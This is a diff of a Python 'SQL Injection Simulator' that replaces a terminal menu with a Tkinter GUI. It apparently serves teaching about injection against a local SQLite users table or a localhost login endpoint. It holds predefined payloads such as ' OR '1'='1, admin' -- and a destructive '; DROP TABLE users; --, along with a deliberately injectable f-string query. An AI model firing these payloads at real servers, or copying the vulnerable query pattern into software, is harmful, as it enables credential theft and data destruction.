@@ -47,406 +47,134 @@ Notes:
   - Ensure the database file exists and is accessible before running attacks.
   - For Docker-hosted SQLite3 attacks, ensure the server is running and accessible.
 """
-
 import sqlite3
-import os
-import platform
-import requests  # For making HTTP requests to target servers# For making HTTP requests to target servers
+import tkinter as tk
+from tkinter import ttk, messagebox, scrolledtext
+import requests
 
-class SQLInjectionAttacks:
-    def __init__(self):
-        """
-        Initialize the class with a dictionary of available attacks and counters.
-        """
-        self.attacks = {
-            1: {
-                "function": self.get_user_credentials,
-                "sqli_name": "Extract User Credentials",
-                "default_query": "'OR '1' = '1"  # Default query for this attack
-            },
-            2: {
-                "function": self.target_server,
-                "sqli_name": "Target Docker-Hosted SQLite3",
-                "default_query": "'OR '1' = '1"  # Default query for this attack
-            }
-            # Add more attacks here as needed
-        }
-        self.successful_attacks = 0  # Counter for successful attacks
-        self.unsuccessful_attacks = 0  # Counter for unsuccessful attacks
-        self.max_length = 0  # Maximum length of menu lines (used for scaling)
-        self.current_default_query = ""  # Track default query for handlers
+class SQLInjectionGUI:
+    def __init__(self, root):
+        self.root = root
+        self.root.title("SQL Injection Simulator")
+        self.create_widgets()
+        self.attack_type = tk.StringVar()
+        self.db_type = tk.StringVar(value="users.db")
+        self.url_visible = False
 
-        # Input keys for user interaction
-        self.input_return = 'r'  # Key to return to the main menu
-        self.input_quit = 'q'  # Key to quit the program
+    def create_widgets(self):
+        # Main container
+        main_frame = ttk.Frame(self.root, padding="10")
+        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
 
-        # Database name (e.g., SQLite3)
-        self.db_name = "SQLite3"  # Can be changed to another database name if needed
+        # Attack type selection
+        ttk.Label(main_frame, text="Select Attack Type:").grid(row=0, column=0, sticky=tk.W)
+        self.attack_combobox = ttk.Combobox(main_frame, values=[
+            "Extract User Credentials", 
+            "Target Docker-Hosted SQLite3"
+        ])
+        self.attack_combobox.grid(row=0, column=1, sticky=tk.EW)
+        self.attack_combobox.bind('<<ComboboxSelected>>', self.toggle_url_field)
 
-        # Database connection dispatch dictionary
-        self.db_connection_functions = {
-            "sqlite3": sqlite3.connect,  # SQLite3 connection function
-            # Add other database connection functions here as needed
-            # Example: "mysql": mysql.connector.connect,
-            # Example: "postgresql": psycopg2.connect,
-        }
+        # Database selection
+        ttk.Label(main_frame, text="Target Database:").grid(row=1, column=0, sticky=tk.W)
+        self.db_combobox = ttk.Combobox(main_frame, values=["users.db", "users_secure.db"])
+        self.db_combobox.set("users.db")
+        self.db_combobox.grid(row=1, column=1, sticky=tk.EW)
 
-        # Initialize handler dispatch dictionary
-        self.handlers = {
-            '1': lambda: self.get_handle_query('default'),
-            '2': lambda: self.get_handle_query('manual'),
-            '3': lambda: self.get_handle_query('predefined')
-        }
+        # URL input (hidden by default)
+        self.url_frame = ttk.Frame(main_frame)
+        ttk.Label(self.url_frame, text="Server URL:").grid(row=0, column=0, sticky=tk.W)
+        self.url_entry = ttk.Entry(self.url_frame)
+        self.url_entry.grid(row=0, column=1, sticky=tk.EW)
+        self.url_entry.insert(0, "http://localhost:5000/login")
+        self.url_frame.grid(row=2, column=0, columnspan=2, sticky=tk.EW)
+        self.url_frame.grid_remove()
 
-        # Prompts to the user
-        self.prompt_welcome = "Welcome to the SQL Injection Simulator!"
-        self.prompt_description = "This program demonstrates SQL injection attacks in a controlled environment."
-        self.prompt_instructions = f"Follow the instructions below to simulate an attack. Press {self.input_quit} to quit or {self.input_return} to return to the main menu at any time."
-        self.prompt_attack_choice = f"\nEnter the attack number or name (or press {self.input_return} to return to the main menu): "
-        self.prompt_db_file = f"Enter the database file name or path (default: test.db, or press {self.input_return} to return to the main menu): "
-        self.prompt_query_options = "=== Query Input Options ==="
-        self.prompt_query_default = "1. Use default query (if available)"
-        self.prompt_query_manual = "2. Manually input username/query"
-        self.prompt_query_predefined = "3. Select from a list of predefined queries"
-        self.prompt_query_separator = "==========================="
-        self.prompt_query_choice = f"Enter your choice (1, 2, or 3, or press {self.input_return} to return to the main menu): "
-        self.prompt_username = f"Enter the username/query to probe (or press {self.input_return} to return to the main menu): "
-        self.prompt_executing = "\nExecuting {}..."
-        self.prompt_results = "\nAttack Results:"
-        self.prompt_no_results = "\nNo results found or an error occurred."
-        self.prompt_continue = f"\nDo you want to perform another attack? (y/n, or press {self.input_return} to return to the main menu): "
-        self.prompt_exit = "Exiting the program. Goodbye!"
-
-        # Debug and informational prompts
-        self.prompt_db_connect_attempt = f"{self.db_name}: Attempting to connect to {{}}..."
-        self.prompt_db_connect_success = f"{self.db_name}: Established connection to {{}}!"
-        self.prompt_db_cursor_init = f"{self.db_name}: Initializing cursor..."
-        self.prompt_db_cursor_success = f"{self.db_name}: Cursor initialized!"
-        self.prompt_query_execution = "\nExecuting Query: {}"
-        self.prompt_extraction_success = "Extraction Successful!\n"
-        self.prompt_extraction_failure = "Extraction Unsuccessful.\n"
-        self.prompt_invalid_choice = f"Invalid choice. Please try again or press {self.input_return} to return to the main menu."
-        self.prompt_invalid_option = f"Invalid option. Please try again or press {self.input_return} to return to the main menu."
-        self.prompt_no_default_query = "No default query available for this attack. Please choose another option."
-        self.prompt_using_default_query = "Using default query: {}"
+        # Query input
+        ttk.Label(main_frame, text="Enter Query/Username:").grid(row=3, column=0, sticky=tk.W)
+        self.query_entry = ttk.Entry(main_frame)
+        self.query_entry.grid(row=3, column=1, sticky=tk.EW)
+        self.query_entry.insert(0, "' OR '1'='1")
 
         # Predefined queries
-        self.predefined_queries = [
-            "'OR '1' = '1",
+        ttk.Label(main_frame, text="Predefined Queries:").grid(row=4, column=0, sticky=tk.W)
+        self.query_combobox = ttk.Combobox(main_frame, values=[
+            "' OR '1'='1",
             "admin' --",
             "'; DROP TABLE users; --"
-        ]
+        ])
+        self.query_combobox.grid(row=4, column=1, sticky=tk.EW)
+        self.query_combobox.bind('<<ComboboxSelected>>', self.update_query_entry)
 
-        # Predefined query menu lines (moved to class body for reusability)
-        self.predefined_lines = [
-            "=== Predefined Queries ===",
-            *[f"{i}. {query}" for i, query in enumerate(self.predefined_queries, start=1)],
-            "========================="
-        ]
+        # Execute button
+        self.execute_btn = ttk.Button(main_frame, text="Execute Attack", command=self.execute_attack)
+        self.execute_btn.grid(row=5, column=0, columnspan=2, pady=10)
 
-        # Query input options (precomputed for dynamic programming)
-        self.query_options = [
-            self.prompt_query_options,
-            self.prompt_query_default,
-            self.prompt_query_manual,
-            self.prompt_query_predefined,
-            self.prompt_query_separator
-        ]
+        # Results display
+        self.results_area = scrolledtext.ScrolledText(main_frame, width=60, height=15)
+        self.results_area.grid(row=6, column=0, columnspan=2, sticky=tk.EW)
 
-        # Menu description (precomputed for dynamic programming)
-        self.menu_description = [
-            self.prompt_welcome,
-            self.prompt_description,
-            self.prompt_instructions
-        ]
+        # Configure grid weights
+        main_frame.columnconfigure(1, weight=1)
 
-        # Menu options (precomputed for dynamic programming)
-        self.menu_lines = [
-            "=== SQL Injection Attack Menu ===",
-            *[f"{attack_ID}. {attack_info['sqli_name']}" for attack_ID, attack_info in self.attacks.items()],
-            "================================",
-            f"Successful Attacks: {self.successful_attacks}",
-            f"Unsuccessful Attacks: {self.unsuccessful_attacks}",
-            "================================"
-        ]
-
-    def clear_screen(self):
-        """
-        Clears the terminal screen.
-        """
-        if platform.system() == "Windows":
-            os.system("cls")
+    def toggle_url_field(self, event=None):
+        attack_type = self.attack_combobox.get()
+        if "Docker" in attack_type:
+            self.url_frame.grid()
+            self.url_visible = True
         else:
-            os.system("clear")
+            self.url_frame.grid_remove()
+            self.url_visible = False
 
-    def manage_db_connection(self, attack_ID, query, db='test.db'):
-        """
-        Manages the database connection and executes the selected attack.
-        Uses a dispatch dictionary to determine the appropriate database connection function.
-        """
-        db_connection = None  # Initialize the variable outside the try block
-        try:
-            # Get the database connection function based on self.db_name
-            db_connect_function = self.db_connection_functions.get(self.db_name.lower())
-            if not db_connect_function:
-                raise ValueError(f"Unsupported database type: {self.db_name}")
+    def update_query_entry(self, event=None):
+        self.query_entry.delete(0, tk.END)
+        self.query_entry.insert(0, self.query_combobox.get())
 
-            print(self.prompt_db_connect_attempt.format(db))  # Debug
-            db_connection = db_connect_function(db)  # Connect to the database
-            print(self.prompt_db_connect_success.format(db))  # Debug
+    def display_results(self, message):
+        self.results_area.insert(tk.END, message + "\n")
+        self.results_area.see(tk.END)
 
-            print(self.prompt_db_cursor_init)  # Debug
-            db_cursor = db_connection.cursor()  # Create a cursor
-            print(self.prompt_db_cursor_success)  # Debug
+    def execute_attack(self):
+        attack_type = self.attack_combobox.get()
+        db_file = self.db_combobox.get()
+        query = self.query_entry.get()
+        url = self.url_entry.get() if self.url_visible else ""
 
-            # Execute the selected attack
-            result = self.execute_attack(attack_ID, query, db_connection, db_cursor)
-
-            return result
-
-        except Exception as e:
-            print(f"Database error: {e}")
-            return None
-
-        finally:
-            # Close the connection if it was successfully opened
-            if db_connection:
-                db_connection.close()
-
-    def execute_attack(self, attack_ID, query, db_connection, db_cursor):
-        """
-        Executes the attack based on the attack_ID and provided query.
-        """
-        if attack_ID in self.attacks:
-            return self.attacks[attack_ID]["function"](query, db_connection, db_cursor)
-        else:
-            raise ValueError(f"Invalid attack_ID: {attack_ID}")
-
-    def get_user_credentials(self, query, db_connection, db_cursor):
-        """
-        Probes the database for vulnerabilities and attempts to extract all users.
-        """
-        # Construct the query
-        probe_query = f"SELECT * FROM users WHERE username = '{query}'"
-        print(self.prompt_query_execution.format(probe_query))  # Debug
-
-        db_cursor.execute(probe_query)
-
-        # If successful, collect all user data
-        probe_result = db_cursor.fetchall()  # Returns a list of tuples or an empty list
-        if len(probe_result) > 0:
-            print(self.prompt_extraction_success)
-            self.successful_attacks += 1  # Increment successful attacks counter
-        else:
-            print(self.prompt_extraction_failure)
-            self.unsuccessful_attacks += 1  # Increment unsuccessful attacks counter
-
-        return probe_result
-
-    def target_server(self, query, db_connection, db_cursor):
-        """
-        Simulates an SQL injection attack against a Docker-hosted SQLite3 database.
-        This method assumes the server is running a SQLite3 database in a Docker container.
-        """
-        # Default Docker server URL (can be overridden by user input)
-        default_server_url = "http://localhost:8080"
-        server_url = input(f"Enter the server URL (default: {default_server_url}): ").strip() or default_server_url
-
-        # Construct the malicious query
-        malicious_query = f"SELECT * FROM users WHERE username = '{query}'"
-        print(f"Sending malicious query to Docker-hosted SQLite3 server: {malicious_query}")
+        self.display_results("\n=== Attack Parameters ===")
+        self.display_results(f"Attack Type: {attack_type}")
+        self.display_results(f"Target Database: {db_file}")
+        self.display_results(f"Query: {query}")
+        if self.url_visible:
+            self.display_results(f"Target URL: {url}")
 
         try:
-            # Simulate sending the query to the server (e.g., via HTTP POST)
-            response = requests.post(server_url, data={"query": malicious_query})
-            if response.status_code == 200:
-                print(self.prompt_extraction_success)
-                self.successful_attacks += 1  # Increment successful attacks counter
-                return response.json()  # Assuming the server returns JSON data
-            else:
-                print(self.prompt_extraction_failure)
-                self.unsuccessful_attacks += 1  # Increment unsuccessful attacks counter
-                return None
+            if "Credentials" in attack_type:
+                conn = sqlite3.connect(db_file)
+                cursor = conn.cursor()
+                probe_query = f"SELECT * FROM users WHERE username = '{query}'"
+                cursor.execute(probe_query)
+                results = cursor.fetchall()
+                conn.close()
+
+                if results:
+                    self.display_results("\n=== Results ===")
+                    for row in results:
+                        self.display_results(str(row))
+                else:
+                    self.display_results("\nNo results found")
+                
+            elif "Docker" in attack_type:
+                data = {"username": query, "password": "any"}
+                response = requests.post(url, data=data)
+                self.display_results("\n=== Server Response ===")
+                self.display_results(f"Status Code: {response.status_code}")
+                self.display_results(f"Response Content:\n{response.text}")
+
         except Exception as e:
-            print(f"Server error: {e}")
-            return None
+            messagebox.showerror("Error", str(e))
+            self.display_results(f"\nError: {str(e)}")
 
-    def print_centered(self, text):
-        """
-        Prints text centered in the terminal window.
-        """
-        for line in text.splitlines():
-            print(line.center(self.max_length))
-
-    def display_menu(self):
-        """
-        Displays a formatted menu of available SQL injection methods and attack statistics.
-        """
-        # Combine description and menu lines
-        full_menu = self.menu_description + [""] + self.menu_lines
-
-        # Determine the longest line in the menu
-        self.max_length = max(len(line) for line in full_menu)
-
-        # Print the menu without stars
-        for line in full_menu:
-            print(line.center(self.max_length))
-
-    def get_user_choice(self):
-        """
-        Prompts the user to select an attack by number or name.
-        """
-        while True:
-            choice = input(self.prompt_attack_choice).strip().lower()
-            if choice == self.input_quit:
-                print(self.prompt_exit)
-                exit()  # Quit the program
-            if choice == self.input_return:
-                return None  # Return to main menu
-            # Check if the input is a valid attack number
-            if choice.isdigit() and int(choice) in self.attacks:
-                return int(choice)
-            # Check if the input is a valid attack name
-            for attack_ID, attack_info in self.attacks.items():
-                if choice == attack_info["sqli_name"].lower():
-                    return attack_ID
-            print(self.prompt_invalid_choice)
-
-    def get_handle_query(self, query_type):
-        """
-        Generalized handler for query input options (default, manual, predefined).
-        Repeated code is moved outside the if/elif/else blocks.
-        """
-        # Common variables and logic
-        if query_type == 'default':
-            if self.current_default_query:
-                print(self.prompt_using_default_query.format(self.current_default_query))
-                return self.current_default_query
-            else:
-                print(self.prompt_no_default_query)
-                return None
-
-        elif query_type == 'manual':
-            username = input(self.prompt_username).strip()
-            if username.lower() == self.input_quit:
-                print(self.prompt_exit)
-                exit()  # Quit the program
-            if username.lower() == self.input_return:
-                return None  # Return to main menu
-            return username
-
-        elif query_type == 'predefined':
-            # Print the predefined queries
-            for line in self.predefined_lines:
-                print(line.center(self.max_length))
-
-            query_choice = input("Select a query by number: ").strip().lower()
-            if query_choice == self.input_quit:
-                print(self.prompt_exit)
-                exit()  # Quit the program
-            if query_choice == self.input_return:
-                return None  # Return to main menu
-            if query_choice.isdigit() and 1 <= int(query_choice) <= len(self.predefined_queries):
-                return self.predefined_queries[int(query_choice) - 1]
-            else:
-                print(self.prompt_invalid_choice)
-                return None
-
-        else:
-            raise ValueError(f"Invalid query type: {query_type}")
-
-    def get_query_input(self, attack_ID):
-        """
-        Prompts the user to select a query option using class-level handlers.
-        """
-        attack_info = self.attacks[attack_ID]
-        self.current_default_query = attack_info.get("default_query", "")  # Store for handlers
-
-        # Print the query input options
-        for line in self.query_options:
-            print(line.center(self.max_length))
-
-        while True:
-            option = input(self.prompt_query_choice).strip().lower()
-            if option == self.input_quit:
-                print(self.prompt_exit)
-                exit()  # Quit the program
-            if option == self.input_return:
-                return None  # Return to main menu
-
-            handler = self.handlers.get(option)
-            if handler:
-                result = handler()
-                if result is not None:
-                    return result
-            else:
-                print(self.prompt_invalid_option)
-
-    def main_menu(self):
-        """
-        Main menu function to interact with the user.
-        Loops until the user enters "n" to exit.
-        """
-        while True:
-            # Display the menu
-            self.display_menu()
-
-            # Get the user's choice
-            attack_ID = self.get_user_choice()
-            if attack_ID is None:
-                continue  # Return to main menu
-
-            # Get the database file name or path
-            db = input(self.prompt_db_file).strip()
-            if db.lower() == self.input_quit:
-                print(self.prompt_exit)
-                break  # Quit the program
-            if db.lower() == self.input_return:
-                continue  # Return to main menu
-            if not db:
-                db = 'test.db'
-
-            # Check if the user entered a database type (e.g., SQLite3)
-            if db.lower() in self.db_connection_functions:
-                self.db_name = db  # Update the database type
-                db = 'test.db'  # Use the default database file
-
-            # Get the query input
-            query = self.get_query_input(attack_ID)
-            if query is None:
-                continue  # Return to main menu
-
-            # Clear the screen before executing the attack
-            self.clear_screen()
-
-            # Execute the selected attack
-            print(self.prompt_executing.format(self.attacks[attack_ID]['sqli_name']))
-            result = self.manage_db_connection(attack_ID, query, db)
-
-            # Display the results
-            if result:
-                print(self.prompt_results)
-                for row in result:
-                    print(row)
-            else:
-                print(self.prompt_no_results)
-
-            # Ask the user if they want to continue
-            continue_choice = input(self.prompt_continue).strip().lower()
-            if continue_choice == self.input_quit:
-                print(self.prompt_exit)
-                break  # Quit the program
-            if continue_choice == self.input_return:
-                continue  # Return to main menu
-            if continue_choice != 'y':
-                print(self.prompt_exit)
-                break
-
-
-# Example usage
 if __name__ == "__main__":
-    # Create an instance of the class
-    sql_attacks = SQLInjectionAttacks()
-
-    # Run the main menu
-    sql_attacks.main_menu()
+    root = tk.Tk()
+    app = SQLInjectionGUI(root)
+    root.mainloop()
